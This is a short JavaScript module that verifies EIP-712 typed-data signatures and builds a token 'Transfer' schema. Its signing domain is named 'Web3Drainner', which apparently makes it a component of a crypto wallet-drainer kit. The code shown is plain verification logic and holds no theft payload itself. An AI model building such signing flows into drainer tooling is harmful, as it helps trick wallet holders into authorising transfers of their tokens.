import { ethers } from 'ethers'

/**
 * EIP-712 Signature Verification
 * Verifies signatures signed with eth_signTypedData_v4
 */

export class EIP712Verifier {
  /**
   * Verify EIP-712 signature and recover signer address
   */
  static verifySig(message, domain, types, signature) {
    try {
      const recoveredAddress = ethers.verifyTypedData(
        domain,
        types,
        message,
        signature
      )
      return recoveredAddress
    } catch (error) {
      console.error('❌ EIP-712 signature verification failed:', error.message)
      throw new Error('Invalid EIP-712 signature')
    }
  }

  /**
   * Create EIP-712 domain for chain
   */
  static createDomain(chainId, verifyingContract = '0x0000000000000000000000000000000000000000') {
    return {
      name: 'Web3Drainner',
      version: '1',
      chainId: chainId,
      verifyingContract: verifyingContract
    }
  }

  /**
   * Create EIP-712 transfer message schema
   */
  static createTransferTypes() {
    return {
      Transfer: [
        { name: 'tokenAddress', type: 'address' },
        { name: 'amount', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
        { name: 'chains', type: 'string' }
      ]
    }
  }

  /**
   * Validate message structure and expiration
   */
  static validateMessage(message) {
    if (!message) {
      throw new Error('Message is required')
    }

    if (!message.deadline) {
      throw new Error('Message deadline is required')
    }

    const now = Math.floor(Date.now() / 1000)
    if (now > message.deadline) {
      throw new Error('Message signature has expired')
    }

    return true
  }

  /**
   * Validate nonce for replay protection
   */
  static validateNonce(nonce) {
    if (typeof nonce !== 'number' || nonce < 0) {
      throw new Error('Invalid nonce')
    }
    return true
  }
}

export default EIP712Verifier
